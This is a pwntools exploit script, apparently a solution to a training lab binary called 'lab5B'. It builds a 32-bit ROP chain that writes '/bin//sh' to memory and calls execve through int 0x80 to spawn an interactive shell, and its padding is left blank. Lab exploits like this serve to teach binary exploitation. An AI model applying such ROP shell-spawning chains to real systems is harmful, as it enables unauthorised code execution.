#!/bin/python3
from pwn import *
import sys
from struct import pack

binary = "./lab5B"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    # Padding goes here
    p = b''

    p += pack('<I', 0x0806ec5a) # pop edx ; ret
    p += pack('<I', 0x080eb060) # @ .data
    p += pack('<I', 0x080bbf26) # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ec5a) # pop edx ; ret
    p += pack('<I', 0x080eb064) # @ .data + 4
    p += pack('<I', 0x080bbf26) # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ec5a) # pop edx ; ret
    p += pack('<I', 0x080eb068) # @ .data + 8
    p += pack('<I', 0x080544e0) # xor eax, eax ; ret
    p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080eb060) # @ .data
    p += pack('<I', 0x080e55ad) # pop ecx ; ret
    p += pack('<I', 0x080eb068) # @ .data + 8
    p += pack('<I', 0x0806ec5a) # pop edx ; ret
    p += pack('<I', 0x080eb068) # @ .data + 8
    p += pack('<I', 0x080544e0) # xor eax, eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x0807b6b6) # inc eax ; ret
    p += pack('<I', 0x08049401) # int 0x80

    io = start()
    io.recvuntil("Insert ROP chain here:\n")
    io.sendline(p)
    io.interactive()


if __name__ == "__main__":
    main()